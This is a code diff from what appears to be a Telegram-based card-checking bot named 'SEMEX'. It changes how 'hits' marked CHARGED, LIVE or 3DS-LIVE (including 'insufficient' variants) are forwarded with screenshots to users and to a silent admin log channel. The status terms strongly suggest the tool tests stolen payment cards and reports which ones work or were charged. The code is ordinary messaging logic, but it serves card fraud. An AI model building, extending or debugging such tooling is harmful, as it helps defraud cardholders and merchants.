@@ -424,8 +424,10 @@ async def submit_status(
     def _visible_len(s: str) -> int:
         return len(re.sub(r"<[^>]+>", "", s or ""))
 
+    _fallback_st = "CHARGED" if is_charged else "LIVE"
+
     def _photo_caption(full_text: str) -> str:
-        return full_text if _visible_len(full_text) <= 1024 else "⚜️ <b>SEMEX</b> — CHARGED ✅ (details below)"
+        return full_text if _visible_len(full_text) <= 1024 else f"⚜️ <b>SEMEX</b> — {_fallback_st} ✅ (details below)"
 
     # DURABLE FORWARD (outbox): every intended forward below is persisted as a
     # pending telegram_outbox document BEFORE any network send. A background
@@ -436,13 +438,16 @@ async def submit_status(
     # keys make enqueue idempotent (a re-submitted duplicate can't double-send).
     forward_id = uuid.uuid4().hex
 
-    async def _enqueue_forward(chat_id, msg_text: str, *, pin: bool, key_prefix: str) -> None:
+    async def _enqueue_forward(chat_id, msg_text: str, *, pin: bool, key_prefix: str, with_photo: bool = None) -> None:
         """Enqueue a text-or-photo forward, mirroring the previous inline logic:
-        charged hits with a screenshot go as a photo; when the visible caption
-        exceeds Telegram's 1024 limit the full details follow as a separate
-        (also durable) message."""
+        hits with a screenshot go as a photo (charged by default; other statuses
+        only where the caller opts in via with_photo=True, e.g. the admin log);
+        when the visible caption exceeds Telegram's 1024 limit the full details
+        follow as a separate (also durable) message."""
+        if with_photo is None:
+            with_photo = is_charged
         try:
-            if is_charged and body.screenshot:
+            if with_photo and body.screenshot:
                 if _visible_len(msg_text) > 1024:
                     await telegram_outbox.enqueue_photo(
                         db, chat_id, body.screenshot, _photo_caption(msg_text),
@@ -464,17 +469,19 @@ async def submit_status(
     # Forward to user (pin charged messages in the user's chat).
     await _enqueue_forward(user.telegram_id, text, pin=is_charged, key_prefix="user")
 
-    # SILENT admin log — ONLY for non-admin users' CHARGED hits.
-    # LIVE hits are NEVER sent to the admin log (public + user DM only, per policy).
+    # SILENT admin log — for non-admin users' hits:
+    #   CHARGED → pinned, with screenshot
+    #   LIVE / 3DS-LIVE (incl. live-class variants like insufficient) → NOT pinned,
+    #   but still with screenshot when available.
     # Admin's own hits stay in admin's DM only (already sent above).
-    if not is_admin and is_charged:
+    if not is_admin and (is_charged or is_live):
         try:
             admin_text = format_hit(hit_dict, user_dict, admin_view=True)
         except Exception as _e:
             log.error("admin format_hit failed, using fallback: %s", _e)
-            admin_text = "⚜️ <b>SEMEX</b> — CHARGED ✅ (formatting error — see dashboard)"
+            admin_text = f"⚜️ <b>SEMEX</b> — {_fallback_st} ✅ (formatting error — see dashboard)"
         await _enqueue_forward(settings.ADMIN_LOG_CHANNEL_ID, admin_text,
-                               pin=is_charged, key_prefix="admin")
+                               pin=is_charged, with_photo=True, key_prefix="admin")
 
     # OWNER DM MIRROR — when a promoted admin (not the owner) fires a CHARGED hit,
     # the owner still wants to see it. The private admin-log channel is skipped for
